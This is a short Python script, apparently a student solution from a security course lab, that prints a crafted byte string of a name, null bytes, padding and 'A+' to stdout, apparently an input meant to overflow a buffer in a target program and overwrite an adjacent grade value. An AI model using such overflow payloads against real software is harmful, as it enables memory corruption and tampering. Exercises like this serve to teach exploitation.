#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
string = b"yj21" + b"\x00" + b"X"*5 + b"A+" + b"\x00"

sys.stdout.buffer.write(string)
